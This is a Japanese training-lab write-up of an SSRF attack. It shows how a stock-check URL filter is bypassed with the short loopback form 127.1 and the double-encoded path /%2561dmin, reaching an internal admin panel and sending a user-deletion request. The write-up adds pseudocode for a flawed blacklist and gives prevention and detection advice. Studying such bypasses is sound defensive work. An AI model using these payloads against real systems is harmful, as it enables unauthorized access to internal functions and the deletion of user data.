# SSRF：ブラックリスト回避による内部管理画面へのアクセス

| 項目 | 内容 |

### 検証目的

在庫確認機能でサーバー側の通信先を操作し、内部アドレス・管理画面へのアクセスを制限するブラックリストを、IPアドレスの別表記とURLエンコードの違いにより回避できるか検証する。

## 2. 実務上の攻撃シナリオ

### 2.1 想定するシステムと攻撃者

ECサイトの在庫確認機能が、利用者のリクエストに含まれるURLを使って別の在庫サービスへアクセスする構成を想定する。内部にはユーザー管理画面があり、通常の外部利用者は直接操作できない。

攻撃者は商品ページにアクセスできる一般利用者で、在庫確認処理を踏み台として内部の管理機能へアクセスすることを狙う。

### 2.2 攻撃からインシデントまでの流れ

1. 在庫確認時の `stockApi` パラメータが、サーバーのアクセス先を指定していることを確認する。
2. `127.0.0.1` への接続はフィルターにより拒否される。
3. 一部のURL/IPアドレス処理で `127.0.0.1` と同等に扱われる `127.1` を指定し、文字列ベースの判定をすり抜ける。
4. 次に `/admin` というパスもブロックされるため、`/%2561dmin` というエンコードされた表記を利用する。
5. 結果として内部管理画面にアクセスでき、ユーザー削除機能のパスを把握する。
6. 削除URLも同様の形式で指定し、サーバーに内部管理機能へのリクエストを実行させる。

### 2.3 想定被害

実際の業務システムで同様の問題が存在した場合、ユーザー情報の閲覧・アカウント削除・業務停止・復旧対応などが起こるおそれがある。また、内部で利用されている別の管理サービスまで到達できれば、影響範囲が拡大する可能性がある。

**これらは実務上の想定被害であり、今回のラボで実際の企業に被害が発生したわけではない。**

### 2.4 根本原因と対策のつながり

**根本原因：** サーバーが利用者指定のURLへアクセスでき、内部向け通信の制限が特定の文字列表記に依存していること。URL/IPアドレスの表記やデコードの処理段階によって、検証側と接続側で解釈が食い違う。

**防止策：** URL文字列のブラックリストだけに頼らず、アクセスを許可する宛先を限定する。正規化後のURL、名前解決後のIP、実際の接続先を検証し、ループバック・内部ネットワークなど不要な宛先への接続を防ぐ。内部管理機能側でも認証・認可を徹底する。

**検知策：** 在庫確認APIからの内部IP向けの通信、URLエンコードされた管理パスへのアクセス試行、短時間の繰り返しエラーや管理操作をログで監視する。

## 3. 技術的背景

### 3.1 SSRFとは

SSRFは、Webアプリケーションのサーバーに、攻撃者が指定した宛先へのリクエストを実行させる問題である。

今回の `stockApi` は在庫確認先として使われるURLであり、本来の在庫サービス以外へサーバー側から通信させる余地があった。

### 3.2 IPアドレスの別表記

今回の環境では、以下の表記が同じループバックアドレスとして解釈された。

- `127.0.0.1`：一般的な表記
- `127.1`：短縮した表記

ただし、すべてのソフトウェアやURL処理で必ず同じように扱われるとは限らない。重要なのは、**フィルターが見る表記と、接続処理が解釈する宛先が一致しない可能性**である。

### 3.3 二重URLエンコード

文字 `a` のURLエンコード表記は `%61`。さらに `%` をエンコードすると `%2561` となる。

```text
%2561 → %61 → a
```

複数段階のデコードが行われると、途中のチェックでは `/admin` と一致せず、最終的なアクセスでは `/admin` 相当のパスとして解釈される場合がある。

これは暗号化ではなく、URLの表記を変える処理である。

## 4. 検証手順とHTTP通信

### STEP 1：在庫確認リクエストを捕捉

商品ページの `Check stock` を実行し、Burp Suiteの `Proxy → HTTP history` から `POST /product/stock` をRepeaterへ送信した。

在庫確認先はリクエスト本文の `stockApi` パラメータで指定されている。

### STEP 2：127.0.0.1へのアクセスがブロックされることを確認

Repeaterで在庫確認先を以下に変更して送信。

```http
POST /product/stock HTTP/2
Content-Type: application/x-www-form-urlencoded

stockApi=http://127.0.0.1/
```

レスポンス：

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8

"External stock check blocked for security reasons"
```

ループバックアドレスへの接続が拒否されたことを確認した。

### STEP 3：IPアドレスの短縮表記を試す

リクエスト本文を以下に変更した。

```text
stockApi=http://127.1/
```

**HTMLレスポンスを取得できた。** この段階では管理画面へのアクセス成功までは確認していない。

### STEP 4：管理画面パスをそのまま指定

```text
stockApi=http://127.1/admin
```

レスポンス：

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8

"External stock check blocked for security reasons"
```

短縮IP表記ではホストの制限を回避できたが、`/admin` パスは別途ブロックされると分かった。

### STEP 5：二重URLエンコードで管理画面への接続を試す

```text
stockApi=http://127.1/%2561dmin
```

**管理画面のHTMLを取得できた。**

IPアドレスの別表記とエンコードされたパスを組み合わせることで、今回のブラックリストを回避した。

### STEP 6：ユーザー削除URLへリクエストを送信

```text
stockApi=http://127.1/%2561dmin/delete?username=carlos
```

Repeaterで `Send` を実行したところ、ラボが **Solved** になった。

※ この最終リクエストのHTTPレスポンス全文は記録していない。Solvedの画面表示を確認した事実として扱う。

## 5. 検証結果と証拠

| 試した値・操作 | 確認した結果 |
|---|---|
| `stockApi=http://127.0.0.1/` | HTTP 400、セキュリティ上の理由でブロック |
| `stockApi=http://127.1/` | HTMLレスポンス取得 |
| `stockApi=http://127.1/admin` | HTTP 400、セキュリティ上の理由でブロック |
| `stockApi=http://127.1/%2561dmin` | 内部管理画面のHTML取得 |
| `stockApi=http://127.1/%2561dmin/delete?username=carlos` | 送信後にLAB Solved |

### 実証できたこと

ブラックリストで拒否される通常の表記を、IPアドレスの別表記と二重URLエンコードへ変更すると、内部管理画面へのアクセスとユーザー削除を目的としたリクエストがラボの達成条件を満たした。

最終リクエストの正確なHTTPレスポンスやサーバー内部の削除処理は確認していない。

## 6. 根本原因と技術的考察

### 6.1 文字列ベースのブラックリストの限界

`127.0.0.1` と `/admin` を文字列として禁止しても、同じ接続先を別の表記で示すことができれば、フィルターをすり抜ける可能性がある。

このラボは、**URLの検証時と実際の接続時に異なる解釈が生じること**を利用している。

### 6.2 脆弱な実装を想定した例

以下は概念説明用の擬似コードであり、ラボの内部実装ではない。

```javascript
app.post("/product/stock", async (req, res) => {
  const url = req.body.stockApi;
  if (url.includes("127.0.0.1") || url.includes("/admin")) {
    return res.sendStatus(400);
  }
  const response = await fetch(url);
  res.send(await response.text());
});
```

特定の文字列だけを拒否しても、接続先の正当性は保証できない。実務では任意のURLを受け付けない設計や、信頼できる宛先の許可リスト、ネットワークによる送信制限を優先する。

### 6.3 内部管理画面の認証・認可

SSRFから内部へ到達できても、管理操作の実行には本来適切な認証・認可が必要である。管理機能を内部ネットワークからのみアクセスできるようにすることは、単独では十分な保護にならない。

## 7. 推奨防止策・検知策

### 7.1 在庫確認先の許可リスト化

接続可能な在庫サービスをサーバー側で固定、または厳格に許可する。利用者から任意のURLを受け取る設計を見直す。

### 7.2 URL・接続先の検証

URLの解析・正規化を行い、実際の接続先IPアドレスが許可範囲にあることを確認する。ループバック、プライベートアドレス、リンクローカルなどへの不要な接続を遮断し、DNS解決やリダイレクトによる回避も考慮する。

### 7.3 ネットワーク側の送信制御

Webアプリケーションが在庫確認に必要な宛先以外へ接続できないように制御する。入力の検証と併用して防御を多層化する。

### 7.4 内部管理機能のアクセス制御

内部からのアクセスも無条件に信用せず、ユーザー削除等の操作には認証・権限確認を必須とする。

### 7.5 ログ・監視

- 在庫確認APIに指定された宛先URL（機密値は適切に保護）
- 正規化後のホスト名・接続先IP
- ループバックや管理パスへのアクセス試行
- ブロックされたリクエストの連続発生
- 内部管理操作の主体・対象・結果

SSRFの試行を発見した場合、接続先と管理操作のログを突き合わせて影響を調査する。

## 8. 実務で想定される影響

同様の問題が企業環境に存在した場合、内部向けWebページへのアクセス、非公開情報の取得、ユーザー削除等の管理操作の不正利用、サービス運用の妨害が想定される。

ただし、今回確認できたのは学習環境における内部管理画面の取得およびSolvedであり、実在企業の情報やアカウントへの影響は一切検証していない。

- 最終削除リクエストのHTTPレスポンス全文

- データベース上の削除結果
- 127.1以外の短縮表記や別のエンコード方法の可否

### 復習課題

Q2は正解だったが自信なし。`127.1` と `127.0.0.1` が環境によって同じ宛先として解釈されることと、表記が異なると単純な文字列チェックを回避できる理由を、今後のラボで繰り返し確認する。

あわせて、二重URLエンコードによる表記の変化と、サーバーが接続する最終的な宛先を区別できるようにする。

HTTPの在庫確認リクエストを使い、ブロックされたURLの表記を段階的に変更して、ブラックリストの動作を観察した。`127.1` と `%2561dmin` を組み合わせて内部管理画面へアクセスし、削除リクエストでSolvedを達成した。

今は公式Solutionに沿って手順を再現し、各リクエストでレスポンスがどう変わるかを体験して、Burp Suiteの操作とHTTP通信の感覚を定着させることを優先する。
